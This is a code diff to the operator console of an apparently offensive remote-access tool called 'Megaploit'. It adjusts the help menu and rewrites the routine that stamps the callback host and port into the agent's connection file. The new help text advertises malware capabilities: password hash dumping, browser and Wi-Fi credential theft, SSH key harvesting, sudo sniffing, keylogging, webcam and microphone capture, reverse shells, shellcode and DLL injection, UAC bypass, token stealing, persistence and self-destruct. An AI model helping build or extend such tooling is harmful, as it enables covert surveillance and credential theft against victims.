@@ -399,6 +399,12 @@ class Console:
                 os.system("cls" if os.name == "nt" else "clear")
                 continue
 
+            # Redirect toolbox management commands to the global context
+            if cmd_name == "toolbox":
+                print(warn("  'toolbox' is a global command — type  back  first, then use:"))
+                print(f"  toolbox install <url> <name>  /  toolbox list  /  toolbox info <name>")
+                continue
+
             # Dangerous command confirmation — built-in and plugin commands
             cmds = all_commands()
             is_dangerous = (
@@ -522,27 +528,49 @@ class Console:
         lines = [
             "",
             _c("  Global Commands", _BOLD, _WHITE),
-            _c("  " + "─" * 50, _GREY),
-            f"  {'sessions':<28}  List active sessions",
-            f"  {'use <id>':<28}  Interact with a session",
-            f"  {'generate [-c] [--tls]':<28}  Patch agent.py; -c compiles, --tls enables TLS",
-            f"  {'set <opt> <val>':<28}  Set lhost / port / cert / key",
-            f"  {'toolbox install <url> <name>':<28}  Install a GitHub tool",
-            f"  {'toolbox list':<28}  Show installed tools",
-            f"  {'toolbox search <query>':<28}  Search installed tools",
-            f"  {'toolbox info <name>':<28}  Show tool details",
-            f"  {'toolbox update <name>':<28}  Pull latest changes",
-            f"  {'toolbox remove <name>':<28}  Uninstall a tool",
-            f"  {'toolbox set-entry <name> <path>':<28}  Override entry-point",
-            f"  {'clear':<28}  Clear the terminal",
-            f"  {'exit':<28}  Quit Megaploit",
+            _c("  " + "─" * 55, _GREY),
+            f"  {'sessions':<32}  List active sessions",
+            f"  {'use <id>':<32}  Interact with a session",
+            f"  {'generate [-c] [--tls]':<32}  Patch agent.py; -c compiles, --tls enables TLS",
+            f"  {'set <opt> <val>':<32}  Set lhost / port / cert / key",
+            f"  {'toolbox install <url> <name>':<32}  Install a GitHub tool",
+            f"  {'toolbox list':<32}  Show installed tools",
+            f"  {'toolbox search <query>':<32}  Search installed tools",
+            f"  {'toolbox info <name>':<32}  Show tool details",
+            f"  {'toolbox update <name>':<32}  Pull latest changes",
+            f"  {'toolbox remove <name>':<32}  Uninstall a tool",
+            f"  {'toolbox set-entry <name> <path>':<32}  Override entry-point",
+            f"  {'clear':<32}  Clear the terminal",
+            f"  {'exit':<32}  Quit Megaploit",
             "",
             _c("  Options", _BOLD, _WHITE),
-            _c("  " + "─" * 50, _GREY),
-            f"  {'lhost':<28}  {self.lhost or '(not set)'}",
-            f"  {'port':<28}  {self.port}",
-            f"  {'cert':<28}  {self.cert or '(none)'}",
-            f"  {'key':<28}  {self.key_file or '(none)'}",
+            _c("  " + "─" * 55, _GREY),
+            f"  {'lhost':<32}  {self.lhost or '(not set)'}",
+            f"  {'port':<32}  {self.port}",
+            f"  {'cert':<32}  {self.cert or '(none)'}",
+            f"  {'key':<32}  {self.key_file or '(none)'}",
+            "",
+            _c("  Session Commands (inside  use <id> )", _BOLD, _WHITE),
+            _c("  " + "─" * 55, _GREY),
+            f"  {'File transfer':<32}  upload  download  zip_download",
+            f"  {'Screen / audio':<32}  screenshot  screenshot_timelapse  record  mic_level",
+            f"  {'Screen record':<32}  screenrecord <secs>",
+            f"  {'Streaming':<32}  screen_stream  webcam",
+            f"  {'Credentials':<32}  hashdump  wifi_passwords  browser_history",
+            f"  {'Browser':<32}  browser_creds [cookies|passwords|all]",
+            f"  {'Adv. creds':<32}  cred_vault  ssh_harvest  sudo_sniff",
+            f"  {'Search':<32}  search <path> <keyword>",
+            f"  {'Clipboard':<32}  getclip  setclip",
+            f"  {'Network pivot':<32}  portfwd  socks5  reverse_shell [!]",
+            f"  {'Awareness':<32}  idle_time  sysinfo  mic_level",
+            f"  {'GUI / input':<32}  msgbox  mouse_move  type_keys  lock_screen",
+            f"  {'Injection':<32}  inject_shellcode [!]  dll_inject [!]",
+            f"  {'Priv. esc.':<32}  uac_bypass [!]  token_steal [!]",
+            f"  {'LOLBins':<32}  living_off_land [!]",
+            f"  {'Persistence':<32}  persist  keylog_start/dump/stop",
+            f"  {'Cleanup':<32}  self_destruct [!]",
+            f"  {'Toolbox':<32}  toolbox_run <name>  toolbox_deploy <name>",
+            f"  {'Shell passthrough':<32}  any unrecognised command runs as shell",
             "",
         ]
         if tools:
@@ -952,24 +980,24 @@ def _patch_agent(lhost: str, port: int, use_tls: bool = False) -> None:
 
 
 def _patch_connection_module(lhost: str, port: int, use_tls: bool) -> None:
-    """Overwrite the LHOST / PORT / USE_TLS lines in connection.py."""
+    """Overwrite the LHOST / PORT / USE_TLS lines in connection.py using regex."""
+    import re
     path = os.path.join("megaploit", "agent", "connection.py")
     try:
-        with open(path, "r") as f:
-            lines = f.readlines()
+        with open(path, "r", encoding="utf-8") as f:
+            src = f.read()
 
-        def _replace(lines, prefix, new_line):
-            for i, l in enumerate(lines):
-                if l.startswith(prefix):
-                    lines[i] = new_line
-                    return True
-            return False
+        src = re.sub(r'^LHOST\s*=.*$',
+                     f'LHOST   = "{lhost}"',
+                     src, flags=re.MULTILINE)
+        src = re.sub(r'^PORT\s*=.*$',
+                     f'PORT    = {port}',
+                     src, flags=re.MULTILINE)
+        src = re.sub(r'^USE_TLS\s*=.*$',
+                     f'USE_TLS = {use_tls}   # patched by server',
+                     src, flags=re.MULTILINE)
 
-        _replace(lines, "LHOST", f'LHOST   = "{lhost}"\n')
-        _replace(lines, "PORT",  f'PORT    = {port}\n')
-        _replace(lines, "USE_TLS", f'USE_TLS = {use_tls}   # patched by server\n')
-
-        with open(path, "w") as f:
-            f.writelines(lines)
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(src)
     except IOError as e:
         print(err(f"Patch failed: {e}"))
